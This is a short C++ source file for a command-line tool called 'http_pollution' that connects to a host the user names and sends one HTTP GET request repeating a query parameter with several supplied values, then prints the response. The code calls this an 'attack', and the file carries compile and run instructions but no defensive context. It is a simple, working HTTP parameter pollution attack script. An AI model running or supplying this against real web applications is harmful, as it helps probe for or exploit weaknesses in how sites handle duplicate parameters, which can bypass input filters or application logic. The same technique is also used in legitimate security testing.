// Compile: g++ -o http_pollution http_pollution.cpp
// Run: ./http_pollution <host> <port> <param> <values...>
// No special privileges required

#include <iostream>
#include <cstring>
#include <string>
#include <vector>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

class HTTPPollution {
public:
    void attack(const std::string& host, int port, 
                const std::string& param, 
                const std::vector<std::string>& values) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return;
        
        struct hostent* server = gethostbyname(host.c_str());
        if (!server) { close(sock); return; }
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
        
        if (::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            return;
        }
        
        // Build query with duplicate parameters
        std::string query = "?";
        for (size_t i = 0; i < values.size(); i++) {
            if (i > 0) query += "&";
            query += param + "=" + values[i];
        }
        
        std::string request = 
            "GET /" + query + " HTTP/1.1\r\n"
            "Host: " + host + "\r\n"
            "\r\n";
        
        send(sock, request.c_str(), request.length(), 0);
        
        char buffer[4096];
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            std::cout << buffer << std::endl;
        }
        
        close(sock);
    }
};

int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cerr << "Usage: " << argv[0] << " <host> <port> <param> <values...>\n";
        return 1;
    }
    HTTPPollution pollution;
    std::vector<std::string> values;
    for (int i = 4; i < argc; i++) values.push_back(argv[i]);
    pollution.attack(argv[1], atoi(argv[2]), argv[3], values);
    return 0;
}